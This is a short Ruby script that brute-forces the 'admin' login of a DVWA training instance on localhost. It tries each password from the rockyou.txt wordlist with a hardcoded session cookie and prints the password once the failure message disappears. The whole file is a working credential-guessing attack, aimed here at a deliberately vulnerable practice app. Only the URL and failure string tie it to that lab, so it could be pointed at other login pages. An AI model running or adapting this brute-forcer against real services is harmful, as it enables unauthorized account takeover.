require "net/http"
require "nokogiri"
require "colorize"

$url = "http://localhost:8080/DVWA-master/vulnerabilities/brute/?username=%s&password=%s&Login=Login#"
cookie = "security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e"

File.open("../../rockyou.txt", "r").each do |password|
  url = URI $url.to_s % ["admin", password]
  req = Net::HTTP::Get.new url
  req["cookie"] = cookie

  res = Net::HTTP.start(url.hostname, url.port) { |http|; http.request req }
  doc = Nokogiri::HTML res.body
  if (doc.search("pre")[0].to_s != "<pre><br>Username and/or password incorrect.</pre>")
    puts "found password is => #{password.green}"
    exit
  end
end
